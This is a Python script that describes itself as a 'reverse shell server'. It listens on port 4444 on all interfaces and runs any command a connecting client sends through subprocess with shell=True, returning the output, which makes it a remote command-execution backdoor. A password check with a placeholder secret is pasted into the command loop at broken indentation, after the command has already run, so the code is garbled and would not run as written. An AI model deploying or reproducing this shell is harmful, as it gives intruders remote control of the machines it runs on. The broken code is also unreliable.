#!/usr/bin/env python3
import socket
import subprocess
import os
import threading
import sys

def handle_client(client_socket, address):
    """Handle individual client connections"""
    print(f"[+] Connection established from {address}")
    
    try:
        while True:
            # Send command prompt
            client_socket.send(b"shell> ")
            
            # Receive command from client
            command = client_socket.recv(1024).decode('utf-8').strip()
            
            if not command:
                break
                
            if command.lower() in ['exit', 'quit']:
                client_socket.send(b"Connection closed.\n")
                break
            
            try:
                # Execute the command
                if command.startswith('cd '):
                    # Handle cd command separately
                    directory = command[3:].strip()
                    try:
                        os.chdir(directory)
                        output = f"Changed directory to {os.getcwd()}\n"
                    except Exception as e:
                        output = f"Error: {str(e)}\n"
                else:
                    # Execute other commands
                    output = subprocess.check_output(
                        command, 
                        shell=True, 
                        stderr=subprocess.STDOUT, 
                        stdin=subprocess.DEVNULL
                    )
                # Request authentication
client_socket.send(b"Enter password: ")
password = client_socket.recv(1024).decode('utf-8').strip()
if password != "your_secret_password":
    client_socket.send(b"Authentication failed!\n")
    client_socket.close()
    return
client_socket.send(b"Authentication successful!\n")
                client_socket.send(output)
                
            except subprocess.CalledProcessError as e:
                client_socket.send(f"Error: {e.output.decode('utf-8')}".encode('utf-8'))
            except Exception as e:
                client_socket.send(f"Error executing command: {str(e)}\n".encode('utf-8'))
                
    except Exception as e:
        print(f"Error handling client {address}: {str(e)}")
    finally:
        client_socket.close()
        print(f"[-] Connection closed from {address}")

def start_server(host='0.0.0.0', port=4444):
    """Start the reverse shell server"""
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    
    try:
        server.bind((host, port))
        server.listen(5)
        print(f"[*] Server listening on {host}:{port}")
        print("[*] Waiting for incoming connections...")
        
        while True:
            client_socket, address = server.accept()
            
            # Start a new thread for each client
            client_thread = threading.Thread(
                target=handle_client, 
                args=(client_socket, address)
            )
            client_thread.daemon = True
            client_thread.start()
            
    except KeyboardInterrupt:
        print("\n[*] Server shutting down...")
    except Exception as e:
        print(f"Server error: {str(e)}")
    finally:
        server.close()

if __name__ == "__main__":
    # You can change the port here if needed
    PORT = 4444
    if len(sys.argv) > 1:
        try:
            PORT = int(sys.argv[1])
        except ValueError:
            print("Invalid port number. Using default port 4444")
    
    start_server(port=PORT)
